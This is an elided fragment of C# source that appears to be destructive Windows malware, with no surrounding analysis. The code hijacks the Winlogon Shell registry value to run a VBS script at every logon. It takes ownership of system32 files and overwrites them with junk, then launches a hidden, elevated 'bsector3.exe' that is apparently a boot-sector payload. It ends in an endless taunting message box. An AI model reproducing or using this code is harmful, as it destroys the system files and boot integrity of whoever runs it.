    ...
    internal sealed class Program
    {
        ...
        private static void Main(string[] args) {
            if (System.IO.File.Exists("kek.txt")) {
                try {
                    RegistryKey key =
                        Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon");
                    ...
                    key.SetValue("Shell",
                        @"explorer.exe, wscript.exe ""C:\windows\winbase_base_procid_none\secureloc0x65\WinRapistI386.vbs""");
                ...
                if (System.IO.File.Exists("C:\\windows\\WinAttr.gci")) {
                    ...
                    for (int a = 0; a < files2owr.Length; a++) {
                        try {
                            ...
                            prc.StartInfo.Arguments = @"/c cd\&cd Windows\system32&takeown /f """ + files2owr[a] +
                                                      @"""&icacls """ + files2owr[a] +
                                                      @""" /granted ""%username%"":F&echo xa>""" + files2owr[a] + @"""";
                            ...
                            if (a == files2owr.Length - 1) {
                                ...
                                prcx.StartInfo.Arguments =
                                    @"/c timeout 2&""C:\windows\winbase_base_procid_none\secureloc0x65\bsector3.exe""";
                                prcx.StartInfo.Verb = "runas";
                                prcx.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                                prcx.Start();
                                while (true) {
                                    MessageBox.Show("You messed up..", "uh oh", MessageBoxButtons.OK,
